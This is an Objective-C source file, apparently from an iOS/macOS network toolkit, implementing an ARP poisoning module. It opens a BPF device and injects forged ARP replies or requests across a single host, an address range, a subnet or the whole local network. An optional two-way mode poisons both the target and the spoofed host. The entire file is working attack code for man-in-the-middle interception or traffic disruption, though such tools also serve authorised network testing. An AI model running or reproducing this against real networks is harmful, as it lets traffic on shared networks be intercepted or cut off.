//
//  IJTArpoison.m
//  IJTArpoison
//
//  Created by 聲華 陳 on 2015/4/18.
//  Copyright (c) 2015年 Qbsuran Alang. All rights reserved.
//

#import "IJTArpoison.h"
#import "IJTArptable.h"
#import <sys/socket.h>
#import <net/if.h>
#import <net/if_dl.h>
#import <sys/ioctl.h>
#import <net/bpf.h>
#import <arpa/inet.h>
#import <ifaddrs.h>
#import <net/ethernet.h>
#import <netinet/ip.h>
#import <net/if_arp.h>
#import "IJTSysctl.h"
struct ijt_ether_arp_header {
    struct ether_header ether;
    u_short	ar_hrd;		/* format of hardware address */
    u_short	ar_pro;		/* format of protocol address */
    u_char	ar_hln;		/* length of hardware address */
    u_char	ar_pln;		/* length of protocol address */
    u_short	ar_op;		/* one of: */
    struct ether_addr senderEther;
    struct in_addr senderIP;
    struct ether_addr targetEther;
    struct in_addr targetIP;
} __attribute__((packed));
#define ARP_HDR_LEN 28
@interface IJTArpoison ()

@property (nonatomic) int bpfd;
@property (nonatomic) struct ijt_ether_arp_header sendarp;
@property (nonatomic) in_addr_t startIP;
@property (nonatomic) in_addr_t endIP;
@property (nonatomic) in_addr_t currentIP;
@property (nonatomic) u_short arp_op;
@property (nonatomic) in_addr_t senderIP;
@property (nonatomic) struct ether_addr senderMac;
@property (nonatomic, strong) NSString *senderIpAddress;
@property (nonatomic, strong) NSString *senderMacAddress;
@property (nonatomic) BOOL twoWay;

@property (nonatomic, strong) NSMutableDictionary *arpCacheList;

@end

@implementation IJTArpoison

- (id)initWithInterface: (NSString *)interface {
    self = [super init];
    if(self) {
        self.bpfd = -1;
        _startIP = 0;
        _endIP = 0;
        _currentIP = 0;
        _arp_op = 0;
        [self open: interface];
    }
    return self;
}

- (void)open: (NSString *)interface {
    char buf[256];
    struct ifreq ifr; //interface
    int n = 0, maxbuf;
    
    if(self.bpfd < 0) {
        do {
            snprintf(buf, sizeof(buf), "/dev/bpf%d", n++);
            self.bpfd = open(buf, O_RDWR, 0);
        }//end do
        while (self.bpfd < 0 && (errno == EBUSY || errno == EPERM));
        if(self.bpfd < 0)
            goto BAD;
    }//end if
    
    //get BPF buffer size
    if(ioctl(self.bpfd, BIOCGBLEN, &n) < 0)
        goto BAD;
    
    //try to set max buffer size
    maxbuf = [IJTSysctl sysctlValueByname:@"debug.bpf_maxbufsize"];
    if(maxbuf == -1)
        maxbuf = 1024*512;
    for (n += sizeof(int); n <= maxbuf ; n += sizeof(int)) {
        if (ioctl(_bpfd, BIOCSBLEN, &n) < 0) {
            if (errno == ENOBUFS)
                break;
            goto BAD;
        }
    }
    
    //set interface name
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", [interface UTF8String]);
    if(ioctl(self.bpfd, BIOCSETIF, &ifr) < 0)
        goto BAD;
    
    //即時模式
    n = 1;
    if(ioctl(self.bpfd, BIOCIMMEDIATE, &n) < 0)
        goto BAD;
    
    /*
     *  NetBSD and FreeBSD BPF have an ioctl for enabling/disabling
     *  automatic filling of the link level source address.
     */
    n = 0;
    if (ioctl(self.bpfd, BIOCSHDRCMPLT, &n) < 0)
        goto BAD;
    
    //clear
    memset(&_sendarp, 0, sizeof(_sendarp));
    //ethernet
    _sendarp.ether.ether_type = htons(ETHERTYPE_ARP);
    
    //arp
    _sendarp.ar_hrd = htons(ARPHRD_ETHER);
    _sendarp.ar_hln = ETHER_ADDR_LEN;
    _sendarp.ar_pln = 4;
    _sendarp.ar_pro = htons(ETHERTYPE_IP);
    
    self.errorHappened = NO;
    return;
    
BAD:
    self.errorCode = errno;
    self.errorHappened = YES;
    [self close];
    return;
}

- (void)dealloc {
    [self close];
}

- (void)close {
    if(self.bpfd >= 0) {
        close(self.bpfd);
        self.bpfd = -1;
    }
}

- (int)setFrom: (NSString *)startIpAddress
            to: (NSString *)endIpAddress {
    struct in_addr startIp, endIp;
    
    
    if(inet_pton(AF_INET, [startIpAddress UTF8String], &startIp) == -1)
        goto BAD;
    if(inet_pton(AF_INET, [endIpAddress UTF8String], &endIp) == -1)
        goto BAD;
    
    //range error and swap
    if(startIp.s_addr > endIp.s_addr) {
        in_addr_t temp = startIp.s_addr;
        startIp.s_addr = endIp.s_addr;
        endIp.s_addr = temp;
    }//end if
    
    _startIP = startIp.s_addr;
    _endIP = endIp.s_addr;
    _currentIP = _startIP;
    
    self.errorHappened = NO;
    return 0;
BAD:
    self.errorCode = errno;
    self.errorHappened = YES;
    return -1;
}

- (int)setNetwork: (NSString *)network
            slash: (int)slash {
    struct in_addr startIp, endIp, temp;
    u_int32_t mask;
    
    
    if(slash < 0 || slash > 32) {
        errno = EINVAL;		/* Invalid argument */
        goto BAD;
    }//end if
    
    mask = 1 << 31;
    temp.s_addr = 0;
    if(inet_pton(AF_INET, [network UTF8String], &startIp) == -1)
        goto BAD;
    
    //get real network ip
    for(u_int32_t i = 0 ; i < slash ; i++) {
        if(mask & ntohl(startIp.s_addr))
            temp.s_addr |= mask;
        mask >>= 1;
    }
    startIp.s_addr = htonl(temp.s_addr);
    
    //padding zero bit
    endIp.s_addr = ntohl(startIp.s_addr);
    mask = 1;
    for(u_int32_t i = 0 ; i < 32 - slash ; i++) {
        endIp.s_addr |= mask;
        mask <<= 1;
    }
    endIp.s_addr = htonl(endIp.s_addr);
    
    _startIP = startIp.s_addr;
    _endIP = endIp.s_addr;
    _currentIP = _startIP;
    
    self.errorHappened = NO;
    return 0;
BAD:
    self.errorCode = errno;
    self.errorHappened = YES;
    return -1;
}

- (int)setLAN {
    struct ifreq ifr;
    int sockfd = -1;
    struct in_addr nmask;
    struct in_addr ip;
    int mask = 1;
    int slash = 0;
    
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0)
        goto BAD;
    
    //get mask addr
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "en0");
    if((ioctl(sockfd, SIOCGIFNETMASK, &ifr)) == -1)
        goto BAD;
    memcpy(&nmask.s_addr,
           &(*(struct sockaddr_in *)&ifr.ifr_addr).sin_addr,
           sizeof(nmask.s_addr));
    for(int i = 0 ; i < 32 ; i++) {
        if(mask & nmask.s_addr)
            slash++;
        mask <<= 1;
    }
    
    //get ip addr
    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "en0");
    if((ioctl(sockfd, SIOCGIFADDR, &ifr)) == -1)
        goto BAD;
    memcpy(&ip.s_addr,
           &(*(struct sockaddr_in *)&ifr.ifr_addr).sin_addr, sizeof(ip.s_addr));
    
    close(sockfd);
    
    return [self setNetwork:[NSString stringWithUTF8String:inet_ntoa(ip)]
                      slash:slash];
    
BAD:
    self.errorCode = errno;
    if(sockfd >= 0)
        close(sockfd);
    self.errorHappened = YES;
    return -1;
}

- (int)setOneTarget: (NSString *)ipAddress {
    struct in_addr inaddr;
    if(inet_pton(AF_INET, [ipAddress UTF8String], &inaddr) == -1)
        goto BAD;
    
    _startIP = inaddr.s_addr;
    _endIP = inaddr.s_addr;
    _currentIP = _startIP;
    
    self.errorHappened = NO;
    return 0;
BAD:
    self.errorCode = errno;
    self.errorHappened = YES;
    return -1;
}

- (void)setArpOperation: (IJTArpoisonArpOp)op {
    _arp_op = op;
}

- (void)setTwoWayEnabled: (BOOL)enabled {
    _twoWay = enabled;
}

- (int)setSenderIpAddress: (NSString *)ipAddress senderMacAddress: (NSString *)macAddress {

    struct ether_addr *ether = NULL;
    if(inet_pton(AF_INET, [ipAddress UTF8String], &_senderIP) == -1)
        goto BAD;
    
    _senderIpAddress = [NSString stringWithString:ipAddress];
    
    ether = ether_aton([macAddress UTF8String]);
    if(ether == NULL)
        goto BAD;
    memcpy(&_senderMac, ether, sizeof(_senderMac));
    _senderMacAddress = [NSString stringWithString:macAddress];
    
    self.errorHappened = NO;
    return 0;
BAD:
    self.errorCode = errno;
    self.errorHappened = YES;
    return -1;
}

- (void)readyToInject {
    
    _sendarp.ar_op = htons(_arp_op);
    memset(&_sendarp.ether.ether_dhost, 0, sizeof(_sendarp.ether.ether_dhost));
    memset(&_sendarp.ether.ether_shost, 0, sizeof(_sendarp.ether.ether_shost));
    memset(&_sendarp.senderEther.octet, 0, sizeof(_sendarp.senderEther.octet));
    memset(&_sendarp.senderIP, 0, sizeof(_sendarp.senderIP));
    memset(&_sendarp.targetEther.octet, 0, sizeof(_sendarp.targetEther.octet));
    memset(&_sendarp.targetIP, 0, sizeof(_sendarp.targetIP));
    
    memcpy(&_sendarp.senderEther.octet, &_senderMac, sizeof(_sendarp.senderEther.octet));
    _sendarp.senderIP.s_addr = _senderIP;
    
}

- (int)injectRegisterTarget: (id)target
                   selector: (SEL)selector
                     object: (id)object {
    
    struct ijt_ether_arp_header sendetherarp;
    ArpoisonCallback arpoisoncallback = NULL;
    NSString *targetMacAddress = nil;
    NSString *targetIpAddress = nil;
    char ntop_buf[256];
    struct timeval timestamp = {};
    
    if(ntohl(_currentIP) > ntohl(_endIP))
        goto OK;
    
    if(target && selector) {
        arpoisoncallback = (ArpoisonCallback)[target methodForSelector:selector];
    }
    memcpy(&sendetherarp, &_sendarp, sizeof(sendetherarp));
    
    if(inet_ntop(AF_INET, &_currentIP, ntop_buf, sizeof(ntop_buf)) == NULL)
        goto BAD;
    targetIpAddress = [NSString stringWithUTF8String:ntop_buf];
    
    targetMacAddress = [self.arpCacheList valueForKey:targetIpAddress];
    if(targetMacAddress == nil) {
        goto SKIP;
    }
    
    if(_arp_op == IJTArpoisonArpOpReply) {
        memcpy(&sendetherarp.ether.ether_dhost,
               ether_aton([targetMacAddress UTF8String]),
               sizeof(sendetherarp.ether.ether_dhost));
        memcpy(&sendetherarp.targetEther.octet,
               ether_aton([targetMacAddress UTF8String]),
               sizeof(sendetherarp.targetEther.octet));
        
    }
    else if(_arp_op == IJTArpoisonArpOpRequest) {
        memcpy(&sendetherarp.ether.ether_dhost,
               ether_aton("ff:ff:ff:ff:ff:ff"),
               sizeof(sendetherarp.ether.ether_dhost));
        memcpy(&sendetherarp.targetEther.octet,
               ether_aton("00:00:00:00:00:00"),
               sizeof(sendetherarp.targetEther.octet));
    }
    
    sendetherarp.targetIP.s_addr = _currentIP;
    
    if(write(self.bpfd, &sendetherarp, 42) < 0) {
        goto BAD;
    }
    
    gettimeofday(&timestamp, (struct timezone *)0);
    
    if(arpoisoncallback) {
        arpoisoncallback(target, selector, targetIpAddress, targetMacAddress, _senderIpAddress, _senderMacAddress, timestamp, object);
    }
    else {
        char timestr[16];
        time_t local_tv_sec = timestamp.tv_sec;
        
        strftime(timestr, sizeof timestr, "%H:%M:%S", localtime(&local_tv_sec));
        
        printf("At: %s.%.6d, target: %s(%s)'s %s change to %s\n", timestr, timestamp.tv_usec, [targetIpAddress UTF8String], [targetMacAddress UTF8String], [_senderIpAddress UTF8String], [_senderMacAddress UTF8String]);
    }
    
    if(_twoWay) {
        struct ijt_ether_arp_header sendARP;
        NSString *senderMacAddress = [self.arpCacheList valueForKey:_senderIpAddress];
        if(senderMacAddress != nil) {
            
            memset(&sendARP, 0, sizeof(struct ijt_ether_arp_header));
            memcpy(&sendARP, &sendetherarp, sizeof(struct ijt_ether_arp_header));
            
            sendARP.senderIP.s_addr = sendetherarp.targetIP.s_addr;
            sendARP.targetIP.s_addr = sendetherarp.senderIP.s_addr;
            
            if(_arp_op == IJTArpoisonArpOpReply) {
                memcpy(&sendARP.ether.ether_dhost,
                       ether_aton([senderMacAddress UTF8String]),
                       sizeof(sendARP.ether.ether_dhost));
                memcpy(sendARP.targetEther.octet,
                       ether_aton([senderMacAddress UTF8String]),
                       sizeof(sendARP.targetEther.octet));
            }
            
            if(write(self.bpfd, &sendARP, 42) < 0) {
                goto BAD;
            }
            
            gettimeofday(&timestamp, (struct timezone *)0);
            
            if(arpoisoncallback) {
                arpoisoncallback(target, selector, _senderIpAddress, senderMacAddress, targetIpAddress, _senderMacAddress, timestamp, object);
            }
            else {
                char timestr[16];
                time_t local_tv_sec = timestamp.tv_sec;
                
                strftime(timestr, sizeof timestr, "%H:%M:%S", localtime(&local_tv_sec));
                
                printf("At: %s.%.6d, target: %s(%s)'s %s change to %s\n", timestr, timestamp.tv_usec, [targetIpAddress UTF8String], [targetMacAddress UTF8String], [_senderIpAddress UTF8String], [_senderMacAddress UTF8String]);
            }
        }//end if
    }//end if two-way
    
    
    
    //move to next
    _currentIP = htonl(ntohl(_currentIP) + 1);
    
OK:
    self.errorHappened = NO;
    return 0;
BAD:
    self.errorCode = errno;
    self.errorHappened = YES;
    return -1;
SKIP:
    //move to next
    _currentIP = htonl(ntohl(_currentIP) + 1);
    self.errorCode = ENOENT;
    self.errorHappened = YES;
    return -2;
}

- (void)moveToNext {
    if(ntohl(_currentIP) > ntohl(_endIP))
        return;
    _currentIP = htonl(ntohl(_currentIP) + 1);
}

- (u_int64_t)getTotalInjectCount {
    return (u_int64_t)ntohl(_endIP) - (u_int64_t)ntohl(_startIP) + 1;
}

- (u_int64_t)getRemainInjectCount {
    return (u_int64_t)ntohl(_endIP) - (u_int64_t)ntohl(_currentIP) + 1 <= 0 ? 0 : (u_int64_t)ntohl(_endIP) - (u_int64_t)ntohl(_currentIP) + 1;
}

- (NSString *)getStartIpAddress {
    char ntop_buf[256];
    struct in_addr addr = {_startIP};
    
    inet_ntop(AF_INET, &addr, ntop_buf, sizeof(ntop_buf));
    return [NSString stringWithUTF8String:ntop_buf];
}

- (NSString *)getEndIpAddress {
    char ntop_buf[256];
    struct in_addr addr = {_endIP};
    
    inet_ntop(AF_INET, &addr, ntop_buf, sizeof(ntop_buf));
    return [NSString stringWithUTF8String:ntop_buf];
}

- (NSString *)getCurrentIpAddress {
    char ntop_buf[256];
    struct in_addr addr = {_currentIP};
    
    inet_ntop(AF_INET, &addr, ntop_buf, sizeof(ntop_buf));
    return [NSString stringWithUTF8String:ntop_buf];
}

- (NSString *)getSkipIpAddress {
    char ntop_buf[256];
    struct in_addr addr = {_currentIP};
    
    addr.s_addr = htonl(ntohl(addr.s_addr) - 1);
    
    inet_ntop(AF_INET, &addr, ntop_buf, sizeof(ntop_buf));
    return [NSString stringWithUTF8String:ntop_buf];
}

- (int)storeArpTable {
    IJTArptable *arptable = [[IJTArptable alloc] init];
    if(arptable.errorHappened) {
        errno = arptable.errorCode;
        goto BAD;
    }
    self.arpCacheList = [[NSMutableDictionary alloc] init];
    
    [arptable getAllEntriesSkipHostname:YES target:self selector:ARPTABLE_SHOW_CALLBACK_SEL object:_arpCacheList];
    
    [arptable close];
    self.errorHappened = NO;
    return 0;
    
BAD:
    [arptable close];
    self.errorCode = errno;
    self.errorMessage = arptable.errorMessage;
    self.errorHappened = YES;
    [self close];
    return -1;
}

ARPTABLE_SHOW_CALLBACK_METHOD {
    if(![interface isEqualToString:@"en0"])
        return;
    NSMutableDictionary *dict = (NSMutableDictionary *)object;
    [dict setValue:macAddress forKey:ipAddress];
}
@end
